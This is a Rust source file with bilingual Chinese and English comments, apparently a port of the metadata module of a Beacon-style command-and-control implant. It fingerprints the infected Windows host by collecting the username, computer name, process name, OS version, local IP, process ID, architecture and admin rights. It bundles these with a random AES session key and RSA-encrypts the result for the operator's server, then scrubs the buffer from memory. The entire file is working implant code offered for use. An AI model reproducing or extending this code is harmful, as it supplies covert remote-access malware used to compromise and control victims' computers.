//! 会话元数据（metadata.cpp）。
//! Session metadata (metadata.cpp).

use crate::beacon::*;
use crate::build::Builder;
use crate::channel_tcp::channel_localip;
use crate::elevate::{is_wow64, is_x64};
use crate::security::{rsa_encrypt_once, security_init, KEY_SIZE};
use crate::settings::setting_ptr;
use crate::state::{set_agentid, BIGSESSION, MAJOR_VERSION};
use crate::tokens::is_admin;
use windows_sys::Win32::Globalization::{GetACP, GetOEMCP};
use windows_sys::Win32::Foundation::MAX_PATH;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetModuleFileNameA, GetProcAddress};
use windows_sys::Win32::System::SystemInformation::GetVersionExA;
use windows_sys::Win32::System::SystemInformation::OSVERSIONINFOA;
use windows_sys::Win32::System::Threading::GetCurrentProcess;
use windows_sys::Win32::System::WindowsProgramming::{GetComputerNameA, GetUserNameA};

pub const METADATA_FLAG_NOTHING: u8 = 1;
pub const METADATA_FLAG_AGENT_X64: u8 = 2;
pub const METADATA_FLAG_TARGET_X64: u8 = 4;
pub const METADATA_FLAG_ADMIN: u8 = 8;

/// 将会话元数据填充到构建器中。
/// Populate the session metadata into the builder.
fn populate_metadata(b: &mut Builder, _agentid: u32) {
    let mut user = [0u8; 256];
    let mut computer = [0u8; 256];
    let mut temp = [0u8; 256];
    let mut len: u32 = 256;

    // 确定当前用户名
    // determine the current username
    unsafe {
        GetUserNameA(user.as_mut_ptr() as *mut _, &mut len);
    }

    // 也确定计算机名
    // determine the computer name too
    len = 256;
    unsafe {
        GetComputerNameA(computer.as_mut_ptr() as *mut _, &mut len);
    }

    // 获取我们的本机地址
    // get our localhost
    let localhost = channel_localip();

    // 获取我们的进程名并缩短为仅文件名
    // get our process name and shorten it down to the filename only
    let mut procname: &[u8] = b"";
    unsafe {
        if GetModuleFileNameA(std::ptr::null_mut(), temp.as_mut_ptr() as *mut _, MAX_PATH as u32) != 0 {
            if let Some(idx) = temp.iter().rposition(|&c| c == b'\\') {
                let s = &temp[idx + 1..];
                let end = s.iter().position(|&c| c == 0).unwrap_or(s.len());
                procname = &s[..end];
            }
        }
    }

    // 查询 OS 版本
    // query the OS version
    let mut osvi: OSVERSIONINFOA = unsafe { std::mem::zeroed() };
    osvi.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOA>() as u32;
    unsafe {
        GetVersionExA(&mut osvi);
    }

    // 为后续使用存储主版本号
    // store the major version for use later
    MAJOR_VERSION.store(osvi.dwMajorVersion, std::sync::atomic::Ordering::SeqCst);

    // 推送我们的版本信息
    // push our version info
    b.add_byte(osvi.dwMajorVersion as u8);
    b.add_byte(osvi.dwMinorVersion as u8);
    b.add_short(osvi.dwBuildNumber as u16);

    // 复制我们用于 GetProcAddress 和 GetModuleHandleA 的函数指针
    // copy our function pointers for GetProcAddress and GetModuleHandleA
    b.add_int(0); // 高位（x86 beacon：0）/ high bits (x86 beacon: 0)
    b.add_int(unsafe { GetModuleHandleA(std::ptr::null()) as usize } as u32);
    let gpa = unsafe { GetProcAddress(std::ptr::null_mut(), std::ptr::null()) };
    b.add_int(gpa.map(|f| f as usize).unwrap_or(0) as u32);

    // 添加我们的本机 IP 地址
    // add our localhost IP address
    b.add_int(localhost as u32);

    // 会话标识符［tab 分隔的数据］
    // session identifier [tab delimited data]
    let mut session = Vec::new();
    session.extend_from_slice(&computer[..computer.iter().position(|&c| c == 0).unwrap_or(0)]);
    session.push(b'\t');
    session.extend_from_slice(&user[..user.iter().position(|&c| c == 0).unwrap_or(0)]);
    session.push(b'\t');
    session.extend_from_slice(procname);

    // 将以上内容截断到 58 字节（硬性健全性检查）
    // truncate the above to 58 bytes (hard sanity check)
    let rlen = session.len().min(58);
    b.add_data(&session[..rlen]);
}

/// 初始化代理：加密会话密钥、代理 id、元数据。
/// Initialize the agent: crypto session key, agent id, metadata.
pub fn agent_init(buffer: &mut [u8], max: usize) {
    let mut sessionkey = [0u8; KEY_SIZE];
    // 创建一个［随机］AES 会话密钥
    // create a [random] AES session key
    let _ = getrandom::fill(&mut sessionkey);

    // 初始化我们的加密
    // init our crypto
    security_init(&sessionkey);

    // 确定代理 id
    // determine agent id
    let agentid = genagentid();
    set_agentid(agentid);
    {
        let mut bs = BIGSESSION.lock();
        bs.myid = agentid as i32;
    }

    let encoding_ansi = unsafe { GetACP() } as u16;
    let encoding_oem = unsafe { GetOEMCP() } as u16;

    let mut flagme: u8 = 0;
    if is_x64() {
        flagme |= METADATA_FLAG_AGENT_X64;
    }
    if is_x64() || is_wow64(unsafe { GetCurrentProcess() } as isize) {
        flagme |= METADATA_FLAG_TARGET_X64;
    }
    if is_admin() {
        flagme |= METADATA_FLAG_ADMIN;
    }

    // 用我们的数据格式化缓冲区，便于解密
    // format our buffer with our data, suitable for decrypt
    let mut b = Builder::init(max);
    b.add_data(&sessionkey);
    b.add_data(&encoding_ansi.to_le_bytes());
    b.add_data(&encoding_oem.to_le_bytes());
    b.add_int(agentid);
    b.add_int(unsafe { windows_sys::Win32::System::Threading::GetCurrentProcessId() });
    b.add_short(0); // 端口值——供 SSH 会话使用 / port value--used by SSH sessions
    b.add_byte(flagme);
    populate_metadata(&mut b, agentid);

    let len = b.length_rsa();

    // 将我们的加密数据存入 bigsession，以便之后使用/重用
    // store our encrypted data into bigsession, so we can use/reuse it later
    let meta = b.dest().to_vec();
    {
        let mut bs = BIGSESSION.lock();
        bs.data = [0u8; 1024];
        bs.length = 128;
        let n = len.min(1024);
        bs.data[..n].copy_from_slice(&meta[..n]);
    }

    // RSA 加密我们的 Beacon 元数据
    // RSA encrypt our Beacon metadata
    let pubkey = setting_ptr(SETTING_PUBKEY).unwrap_or(b"");
    let mut outlen = 128usize;
    let mut out = [0u8; 128];
    if !pubkey.is_empty() {
        let _ = rsa_encrypt_once(pubkey, &meta[..len], &mut out, &mut outlen);
        let mut bs = BIGSESSION.lock();
        bs.length = outlen;
        bs.data[..outlen].copy_from_slice(&out[..outlen]);
    }

    // 我们不需要元数据留在内存中……不……绝不
    // we don't need our metadata in memory... nope... nerpz
    buffer[..len].fill(0);
}
